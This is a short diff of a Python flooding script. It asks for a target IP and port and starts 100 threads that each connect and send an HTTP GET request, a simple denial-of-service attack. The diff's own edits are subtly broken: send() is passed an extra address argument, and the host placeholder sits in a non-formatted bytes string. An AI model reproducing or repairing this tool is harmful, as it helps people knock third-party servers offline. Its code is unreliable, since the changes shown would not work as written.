@@ -3,7 +3,7 @@ import threading
 
 # Define the target IP address and port
 target_ip = input("Enter target ip: ")
-target_port = input("Enter target port: ")
+target_port = int(input("Enter target port: "))
 
 # Function to perform the attack
 def attack():
@@ -13,7 +13,7 @@ def attack():
         # Connect to the target
         s.connect((target_ip, target_port))
         # Send a simple HTTP GET request
-        s.sendto(b"GET / HTTP/1.1\r\nHost: target_ip\r\n\r\n", (target_ip, target_port))
+        s.send(b"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n", (target_ip, target_port))
         # Close the socket
         s.close()
 
@@ -21,3 +21,4 @@ def attack():
 for i in range(100):  # Number of threads
     thread = threading.Thread(target=attack)
     thread.start()
+
